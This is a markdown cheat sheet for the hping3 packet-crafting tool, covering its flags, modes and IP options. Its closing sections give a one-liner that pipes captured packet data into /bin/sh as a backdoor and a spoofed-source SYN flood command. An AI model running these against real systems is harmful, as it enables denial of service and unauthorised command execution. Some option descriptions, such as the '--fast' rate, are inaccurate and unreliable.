# Hping3


## **Usage**

```sh
hping3 -h    # Show help
hping3 -v    # Show version
hping3 -c N  # Send N packets
hping3 -i X  # Wait X microseconds between packets
hping3 --fast  # Alias for -i u1000 (10 packets per second)
hping3 --flood  # Send packets as fast as possible
hping3 -n    # Numeric output
hping3 -q    # Quiet mode
hping3 -V    # Verbose mode
```

## **ICMP Usage**

```sh
hping3 -C X  # Set ICMP type (default: echo request)
hping3 -K X  # Set ICMP code (default: 0)
hping3 --force-icmp  # Send all ICMP types
hping3 --icmp-gw  # Set gateway address for ICMP redirect
hping3 --icmp-ts  # ICMP timestamp
hping3 --icmp-addr  # ICMP address subnet mask
```

## **Modes**

```sh
hping3 -0  # RAW IP mode
hping3 -1  # ICMP mode
hping3 -2  # UDP mode
hping3 -8  # SCAN mode (e.g., hping3 --scan 1-30,70-90 -S target.host)
hping3 -9  # Listen mode
```

## **UDP/TCP Parameters**

| Option | Description |
|--------|-------------|
| `-s X` | Set source port |
| `-p X` | Set destination port |
| `-k` | Keep source port unchanged |
| `-w X` | Set TCP window size |
| `-O X` | Set fake TCP data offset |
| `-Q` | Show only TCP sequence numbers |
| `-b` | Send packets with a bad IP checksum |
| `-M X` | Set TCP sequence number |
| `-L X` | Set TCP acknowledgment number |
| `-F` | Set FIN flag |
| `-S` | Set SYN flag |
| `-R` | Set RST flag |
| `-P` | Set PUSH flag |
| `-A` | Set ACK flag |
| `-U` | Set URG flag |
| `-X` | Set X unused flag (0x40) |
| `-Y` | Set Y unused flag (0x80) |

## **IP Options**

| Option | Description |
|--------|-------------|
| `-a X` | Spoof source address |
| `--rand-dest` | Random destination address |
| `--rand-source` | Random source address |
| `-t X` | Set TTL (default: 64) |
| `-N X` | Set packet ID |
| `-f` | Fragment packets |
| `-x` | Set more fragment flag |
| `-y` | Set don't fragment flag |
| `-m X` | Set virtual MTU |
| `-o X` | Set type of service (TOS) |

## **Sniffer Mode**

```sh
hping3 -9 HTTP -I eth0  # Listen and intercept HTTP traffic
```

## **Backdoor**

```sh
hping3 -I eth1 -9 secret | /bin/sh  # Create a simple backdoor
```

## **File Transfer**

```sh
hping3 -1 [IP Addr] -9 signature -I eth0  # Transfer files
```

## **Flooding Attacks**

```sh
hping3 -S [Target IP] -a [Source IP] -p 22 --flood  # Classic flood attack
```


